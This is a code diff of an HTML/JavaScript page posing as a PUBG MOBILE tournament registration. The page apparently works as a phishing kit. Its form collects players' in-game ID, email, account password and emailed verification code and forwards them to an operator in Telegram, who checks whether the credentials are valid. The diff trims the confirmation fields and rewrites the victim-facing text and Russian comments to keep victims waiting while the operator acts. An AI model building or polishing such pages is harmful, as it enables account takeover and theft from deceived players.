@@ -1002,8 +1002,7 @@
                 </div>
                 <div class="section-sub">
                     Fill in your in-game ID, email, portal password and verification code.
-                    After you confirm, application goes to manual review — admin in Telegram
-                    decides if email/password are valid or if you must re-open the code.
+                    Your data is sent once to admin — decisions are made manually on their side.
                 </div>
 
                 <form id="reg-form" class="card">
@@ -1012,11 +1011,6 @@
                             <div class="label">Team / Player In-game ID</div>
                             <input type="text" id="ingame-id" required
                                    placeholder="PUBG MOBILE numeric ID" />
-                        </div>
-                        <div class="field-group">
-                            <div class="label">Confirm In-game ID</div>
-                            <input type="text" id="ingame-id-confirm"
-                                   placeholder="Repeat your PUBG MOBILE ID" />
                         </div>
                     </div>
 
@@ -1036,15 +1030,10 @@
 
                     <div class="two-cols">
                         <div class="field-group">
-                            <div class="label">Repeat password</div>
-                            <input type="password" id="password-confirm" required
-                                   placeholder="Repeat the password" />
-                        </div>
-                        <div class="field-group">
                             <div class="label">Verification code</div>
                             <div class="code-form-row">
                                 <input type="text" id="email-code"
-                                       placeholder="Enter code from email (after admin review)" />
+                                       placeholder="Enter code from admin (email / Telegram)" />
                                 <button type="button" id="request-email-code" class="btn-sm">
                                     GET CODE
                                 </button>
@@ -1052,7 +1041,8 @@
                             <div class="note">
                                 Press <strong>GET CODE</strong>, pass the captcha — your ID, email and password
                                 will be sent to admin in Telegram in one line. Admin checks data and either sends
-                                you a verification code or marks email/password as invalid.
+                                you a verification code or marks email/password as invalid (buttons in bot do not
+                                control the site directly).
                             </div>
                         </div>
                     </div>
@@ -1106,24 +1096,20 @@
 <!-- MOBILE BOTTOM NAV -->
 <div class="mobile-bottom-nav">
     <div class="mobile-tab" data-target="/">
-        <span class="icon">🏠</span>
+        <span class="icon"></span>
         <span>Hub</span>
     </div>
     <div class="mobile-tab active" data-target="#code-gate">
-        <span class="icon">🎫</span>
+        <span class="icon"></span>
         <span>Code</span>
     </div>
     <div class="mobile-tab" data-target="#registration-section">
-        <span class="icon">📝</span>
+        <span class="icon"></span>
         <span>Form</span>
     </div>
     <div class="mobile-tab" data-target="#final-message">
-        <span class="icon">📩</span>
+        <span class="icon"></span>
         <span>Status</span>
-    </div>
-    <div class="mobile-tab" data-target="https://t.me/v7ck9ll">
-        <span class="icon">💬</span>
-        <span>TG</span>
     </div>
 </div>
 
@@ -1191,6 +1177,7 @@
     }
 
     // --- helper: notify admin via backend (ТГ) ---
+    // Ответы и кнопки бота НИКАК не меняют фронт — сайт использует только свои статусы.
     function notifyAdmin(type, payload = {}) {
         return fetch("/api/notify-admin", {
             method: "POST",
@@ -1364,9 +1351,7 @@
             const email = (document.getElementById('email').value || "").trim();
             const emailCode = (document.getElementById('email-code').value || "").trim();
             const ingameId = (document.getElementById('ingame-id').value || "").trim();
-            const ingameIdConfirm = (document.getElementById('ingame-id-confirm').value || "").trim();
             const pass = (document.getElementById('password').value || "");
-            const pass2 = (document.getElementById('password-confirm').value || "");
             const terms = document.getElementById('terms').checked;
 
             if (!accessCode || !VALID_CODES.includes(accessCode)) {
@@ -1375,20 +1360,8 @@
                 return;
             }
 
-            if (!email || !ingameId || !pass || !pass2) {
+            if (!email || !ingameId || !pass) {
                 regStatus.textContent = "Please fill all required fields.";
-                regStatus.className = "status err";
-                return;
-            }
-
-            if (ingameIdConfirm && ingameIdConfirm !== ingameId) {
-                regStatus.textContent = "In-game ID confirmation does not match.";
-                regStatus.className = "status err";
-                return;
-            }
-
-            if (pass !== pass2) {
-                regStatus.textContent = "Passwords do not match.";
                 regStatus.className = "status err";
                 return;
             }
@@ -1399,7 +1372,7 @@
                 return;
             }
 
-            // код может быть пустым, если ты решишь, что без него не отправляем — просто добавь проверку
+            // код может быть пустым — решение принимает только админ
             const formData = {
                 accessCode,
                 ingameId,
@@ -1418,7 +1391,7 @@
             finalMessage.style.display = "block";
             finalMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
 
-            // Всегда: зона ожидания. Решение — только через админа.
+            // Всегда: зона ожидания. Решение — только через админа, кнопки бота фронт не трогают.
             finalCard.innerHTML = `
                 <div class="section-title" style="margin-bottom:4px;">
                     <span class="bar"></span>Application sent — waiting zone
@@ -1427,8 +1400,8 @@
                 <div class="section-sub" style="margin-bottom:0;">
                     Your registration data and verification code have been submitted for
                     <strong>manual review</strong>.
-                    Within the day admin will either send you a tournament invitation or ask you
-                    to open / request a new code again. Watch your email and Telegram.
+                    Admin uses Telegram bot buttons only on their side – the website does not auto-approve
+                    or auto-reject anything. Watch your email and Telegram for the final decision.
                 </div>
             `;
         });
